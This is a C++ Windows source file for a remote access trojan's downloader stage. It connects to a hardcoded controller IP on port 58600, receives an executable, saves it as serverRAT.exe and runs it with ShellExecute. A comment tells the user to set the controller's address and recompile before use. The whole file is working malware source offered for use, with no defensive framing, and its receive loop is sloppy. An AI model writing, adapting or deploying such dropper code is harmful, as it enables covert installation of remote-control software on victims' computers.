#undef UNICODE
#define WIN32_LEAN_AND_MEAN

//By Marc-Antoine Plourde

#include <direct.h>
#include <errno.h>
#include <windows.h>
#include <winSock2.h>
#include <WS2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <shellapi.h>

#pragma warning(disable:4996) //To allow compilation because fwrite methode can be unsafe

using namespace std;

// Need to link wit Ws2_32.lib, Mswock.lib and Advapi32.lib
#pragma comment (lib,"Ws2_32.lib")
#pragma comment (lib,"Mswsock.lib")
#pragma comment (lib,"AdvApi32.lib")

#define BUFLEN_SHORT_MESSAGE 256
#define BUFLEN 512
#define FILE_BUFLEN 1000000
#define INJECTER_PORT "58600"
#define MASTER_IP "127.000.000.001" //The IP adress of the computer controlling the RAT server remotly. Change it and recompile before using this program.

string getCD()
{
	char* cd = _getcwd(0, 0);
	string cdString = cd;
	return cdString;
}

bool SendShortMessage(SOCKET &socket, string shortMessage)
{

	int iResult;
	int shortMessageSize = (int)strlen(shortMessage.c_str());
	bool sentSuccessfully = true;

	//Sending the short message
	iResult = send(socket, shortMessage.c_str(), (shortMessageSize + 1), 0);

	if (iResult == SOCKET_ERROR)
	{

		sentSuccessfully = false;

	}


	return sentSuccessfully;

}

string RecvShortMessage(SOCKET &socket)
{

	bool done = false;
	int cumul = 0;
	int iResult;
	char shortMessageBuf[BUFLEN_SHORT_MESSAGE];
	string shortMessage = "";

	while (!done)//Checking that the received message is containing all the characters.
	{

		//To receive the message
		iResult = recv(socket, &shortMessageBuf[0], BUFLEN_SHORT_MESSAGE, 0);
		if (iResult == SOCKET_ERROR)
		{


			return shortMessage;

		}
		else
			if (iResult>0)
			{

				for (int i = cumul; i < (cumul + iResult); i++)
				{

					if (shortMessageBuf[i] == '\0')//the message was completly received 
					{

						done = true;

						for (int x = 0; x < i; x++)//copy the message in the buff into the string
						{

							shortMessage += shortMessageBuf[x];

						}

						i = (cumul + iResult);

					}

				}

			}
			else
			{

				done = true;
				int i = 0;

				while (shortMessageBuf[i] != 'Ì')
				{

					shortMessage += shortMessageBuf[i];

					i++;

				}

			}

		cumul = iResult;

	}

	return shortMessage;

}

int RecvFile(SOCKET &socket)
{
	string fileSize = "";
	if ((fileSize = RecvShortMessage(socket)) == "")
	{
		return 1; //error occured in RecvShortMessage

	}

	//To send a confirmation of reception to the client
	if (SendShortMessage(socket, "0") == false)//send error
	{

		return 1;

	}

	bool done = false;
	int cumul = 0;
	int iResult;
	char fileBuf[FILE_BUFLEN];

	//To receive the content of the file
	while (!done)
	{

		iResult = recv(socket, fileBuf, FILE_BUFLEN, 0);// not the number of bytes to be received !!!

		cumul += iResult;

		if (iResult == SOCKET_ERROR)
		{


			return(1);
		}

		if (cumul == stoi(fileSize))
		{

			done = true;




		}
		else
		{

			if ((iResult > 0) && (cumul < stoi(fileSize)))//The client has not receive yet all the data 
			{


			}
			else //if the client doesnt receive the right number of bytes
			{

				return 1;
			}

		}

	}

	//Write the file's content on the disk
	FILE* file;
	file = fopen((getCD() +"\\"+ "serverRAT.exe").c_str(), "wb");
	fwrite(fileBuf, sizeof(char), stoi(fileSize), file);
	fclose(file);

	return 0;

}

void main()
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	int iResult;



	// Initilialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{

		return;

	}


	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC; //Address Format Unspecified or AF_INET(for IPV4)
	hints.ai_socktype = SOCK_STREAM; //Provides sequenced,reliable,two-way, connection-base byte stream
	hints.ai_protocol = IPPROTO_TCP; //Indicates that we will use TCP


									 //Resolve the client adress and port
									 //Defines port number and gets remote IP adress (in " result" struct)
	iResult = getaddrinfo(MASTER_IP, INJECTER_PORT, &hints, &result);
	if (iResult != 0)
	{


		WSACleanup();

		return;

	}



	//Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{

		//Create a socket for connectiong to the client
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{



			WSACleanup();

			return;


		}


		//Connect to client
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);//ai_addr is a struct containing IP address and port
		if (iResult == SOCKET_ERROR)
		{

			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;

			continue;

		}
		break;

	}

	freeaddrinfo(result);

	//if server connection failed
	if (ConnectSocket == INVALID_SOCKET)
	{

		WSACleanup();

		return;

	}


	if (RecvFile(ConnectSocket) == 0)
	{

		ShellExecute(NULL, "open", "serverRAT.exe", NULL, NULL, SW_SHOWNORMAL);


	}


		closesocket(ConnectSocket);
		WSACleanup();




}